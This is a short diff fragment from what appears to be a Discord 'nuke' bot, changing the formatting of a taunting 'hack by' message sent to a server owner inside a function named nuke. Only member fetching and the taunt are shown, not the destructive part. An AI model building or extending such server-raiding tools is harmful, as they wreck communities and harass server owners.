@@ -399,7 +399,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' hack by ```💥Moscow⚡⚡⚡#8176```  : ⚠').catch(e => { return void e; });
+  await guild.owner.send(' hack by 💥Moscow⚡⚡⚡#8176  : ⚠').catch(e => { return void e; });
  
  
  
